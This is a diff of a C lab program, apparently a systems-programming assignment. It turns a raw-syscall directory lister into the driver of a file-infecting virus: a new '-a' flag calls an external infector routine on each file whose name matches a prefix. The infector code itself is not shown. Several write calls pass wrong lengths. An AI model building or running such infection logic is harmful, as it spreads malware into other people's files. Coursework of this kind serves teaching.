@@ -1,5 +1,19 @@
-#include <dirent.h>
 #include "util.h"
+
+#define SYS_READ 3
+#define SYS_WRITE 4
+#define SYS_OPEN 5
+#define SYS_CLOSE 6
+#define SYS_LSEEK 19
+#define SEEK_SET 0
+#define SYS_GETDENTS 141
+
+#define O_CW 101
+#define O_RDONLY 0
+
+#define STDIN 0
+#define STDOUT 1
+#define STDERR 2
 
 enum
   {
@@ -23,106 +37,106 @@ enum
 # define DT_WHT		DT_WHT
   };
 
-#define sys_getdents 141
-
-#define SYS_READ 3
-#define SYS_WRITE 4
-#define SYS_OPEN 5
-#define SYS_CLOSE 6
-#define SYS_LSEEK 19
-#define SEEK_SET 0
-
-#define O_CW 101
-#define O_RDONLY 0
-
-#define STDIN 0
-#define STDOUT 1
-
 extern int system_call();
+extern void code_start(void);
+extern void infection(int);
+extern void infector(char *);
+extern void code_end(void);
+
+void printRet(int debug, int sysRet, int sys)
+{
+	if (debug != 0)
+	{
+		system_call(SYS_WRITE, STDERR, "SysId is ", strlen("SysId is "));
+		system_call(SYS_WRITE, STDERR, itoa(sys), (itoa(sys)));
+		system_call(SYS_WRITE, STDERR, "\n", 1);
+		system_call(SYS_WRITE, STDERR, "Sys Return is ", strlen("Sys return is "));
+		system_call(SYS_WRITE, STDERR, itoa(sysRet), (itoa(sysRet)));
+		system_call(SYS_WRITE, STDERR, "\n\n", 2);
+	}
+}
 
 typedef struct ent {
 	int inode;
 	int offset;
 	short len;
 	char buf[1];
-	} ent;
+} ent;
 
-int printNames(int debug, char* prefix)
+void flame2(int debug, char* prefix, int infect)
 {
+	unsigned int startAddress = (unsigned int)&code_start;
+	unsigned int endAddress = (unsigned int)&code_end;
+	system_call(SYS_WRITE, STDOUT, itoa(startAddress), strlen(itoa(startAddress)));
+	system_call(SYS_WRITE, STDOUT, "\n", 1);
+	system_call(SYS_WRITE, STDOUT, itoa(endAddress), strlen(itoa(endAddress)));
+	system_call(SYS_WRITE, STDOUT, "\n\n", 2);
 	char buffer[8192];
-	ent *dir;
-	int dirfd = system_call(SYS_OPEN, ".", O_RDONLY, 00777);
-	if (debug)
-	{
-		system_call(SYS_WRITE, STDOUT, "SysId is 4\n", strlen("SysId is 4\n"));
-		system_call(SYS_WRITE, STDOUT, "SysCall return is ", strlen("SysCall return is "));
-		system_call(SYS_WRITE, STDOUT, itoa(dirfd), strlen(itoa(dirfd)));
-		system_call(SYS_WRITE, STDOUT, "\n\n", 2);
-	}
-	if (dirfd < 0) 
-	{
-		system_call(SYS_WRITE, STDOUT, "Error opening folder\n", strlen("Error opening folder\n"));
-		return 0x55;
-	}
-	int nread = system_call(sys_getdents, dirfd, buffer, 8192);
-	if (debug)
-	{
-		system_call(SYS_WRITE, STDOUT, "SysId is 141\n", strlen("SysId is 141\n"));
-		system_call(SYS_WRITE, STDOUT, "SysCall return is ", strlen("SysCall return is "));
-		system_call(SYS_WRITE, STDOUT, itoa(nread), strlen(itoa(nread)));
-		system_call(SYS_WRITE, STDOUT, "\n\n", 2);
-	}
+	ent *entp;
+	int count;
+	int fd = system_call(SYS_OPEN, ".", O_RDONLY, 0777);
+	count = system_call(SYS_GETDENTS, fd, buffer, 8192);
+	printRet(debug, fd, SYS_OPEN);
+	printRet(debug, count, SYS_GETDENTS);
 	int pos;
-	for(pos = 0; pos < nread;)
+	for (pos = 0; pos < count;)
 	{
-		dir = buffer + pos;
-		pos += dir->len;
-		if (debug)
+		entp = (ent*)(buffer + pos);
+		pos += entp->len;
+		if (debug == 1)
 		{
-			system_call(SYS_WRITE, STDOUT, "DirEnt name is ", strlen("DirEnt name is "));
-			system_call(SYS_WRITE, STDOUT, dir->buf, strlen(dir->buf));
-			system_call(SYS_WRITE, STDOUT, "\n", 1);
-			system_call(SYS_WRITE, STDOUT, "DirEnt length is ", strlen("DirEnt length is "));
-			system_call(SYS_WRITE, STDOUT, itoa(dir->len), strlen(itoa(dir->len)));
-			system_call(SYS_WRITE, STDOUT, "\n\n", 2);
-		}
-		if (strcmp(dir->buf, "..") == 0 || strcmp(dir->buf, ".") == 0)
+			system_call(SYS_WRITE, STDERR, "DirEnt name: ", strlen("DirENt name: "));
+			system_call(SYS_WRITE, STDERR, entp->buf, strlen(entp->buf));
+			system_call(SYS_WRITE, STDERR, "\n", 1);
+			system_call(SYS_WRITE, STDERR, "DirEnt len: ", strlen("DirENt nam: "));
+			system_call(SYS_WRITE, STDERR, itoa(entp->len), strlen(itoa(entp->len)));
+			system_call(SYS_WRITE, STDERR, "\n\n", 2);
+		}	
+		if (strcmp(entp->buf, "..") == 0 || strcmp(entp->buf, ".") == 0 || strncmp(entp->buf, prefix, strlen(prefix)) != 0)
 			continue;
-		if (strlen(prefix) != 0 && strncmp(dir->buf, prefix, strlen(prefix)) != 0) continue;
-		int sysRet = system_call(SYS_WRITE, STDOUT, dir->buf, strlen(dir->buf));
-		system_call(SYS_WRITE, STDOUT, "\n", 1); 
-		char entType = *(buffer + pos + dir->len - 1);
-		char* strType =
-		(entType == DT_REG) ?  "regular" :
-                                    (entType == DT_DIR) ?  "directory" :
-                                    (entType == DT_FIFO) ? "FIFO" :
-                                    (entType == DT_SOCK) ? "socket" :
-                                    (entType == DT_LNK) ?  "symlink" :
-                                    (entType == DT_BLK) ?  "block dev" :
-                                    (entType == DT_CHR) ?  "char dev" : "???";
-		system_call(SYS_WRITE, STDOUT, "Entry type: ", strlen("Entry type: ")); 
-		system_call(SYS_WRITE, STDOUT, strType, strlen(strType));
-		system_call(SYS_WRITE, STDOUT, "\n\n", 2); 
-		if (debug)
+		int sysRet = system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
+		system_call(SYS_WRITE, STDOUT, "\n", 1);
+		printRet(debug, sysRet, SYS_WRITE);
+		char entpType = *(buffer + pos + entp->len - 1);
+		char* entpTypeString = (entpType == DT_REG) ?  "regular" :
+                                    (entpType == DT_DIR) ?  "directory" :
+                                    (entpType == DT_FIFO) ? "FIFO" :
+                                    (entpType == DT_SOCK) ? "socket" :
+                                    (entpType == DT_LNK) ?  "symlink" :
+                                    (entpType == DT_BLK) ?  "block dev" :
+                                    (entpType == DT_CHR) ?  "char dev" : "???";
+		if (strlen(prefix) > 0)
 		{
-			system_call(SYS_WRITE, STDOUT, "SysId is 4\n", strlen("SysId is 4\n"));
-			system_call(SYS_WRITE, STDOUT, "SysCall return is ", strlen("SysCall return is "));
-			system_call(SYS_WRITE, STDOUT, itoa(sysRet), strlen(itoa(sysRet)));
-			system_call(SYS_WRITE, STDOUT, "\n\n", 2);
+			system_call(SYS_WRITE, STDOUT, "File type is ", strlen("file type is "));
+			sysRet = system_call(SYS_WRITE, STDOUT, entpTypeString, strlen(entpTypeString));
+			system_call(SYS_WRITE, STDOUT, "\n", 1);
+			printRet(debug, sysRet, SYS_WRITE);
+		}
+		if (infect == 1)
+		{
+			infector(entp->buf);
 		}
 	}
-	return 0;
 }
 
-int main(int argc, char** argv)
+int main (int argc , char* argv[])
 {
-	int i = 0;
 	int debug = 0;
+	int infect = 0;
 	char* prefix = "\0";
-	for(;i < argc; i++)
+	int i;
+	for(i = 1; i < argc; i++)
 	{
-		if (strcmp(argv[i], "-D") == 0) debug = 1;
-		if (strncmp(argv[i], "-p", 2) == 0) prefix = argv[i] + 2;
+		if (strncmp(argv[i], "-p", 2) == 0)
+			prefix = argv[i] + 2;
+		if (strncmp(argv[i], "-a", 2) == 0)
+		{
+			prefix = argv[i] + 2;
+			infect = 1;
+		}
+		if (strcmp(argv[i], "-D") == 0)
+			debug = 1;
 	}
-	return printNames(debug, prefix);
+	flame2(debug, prefix, infect);
+	return 0;
 }
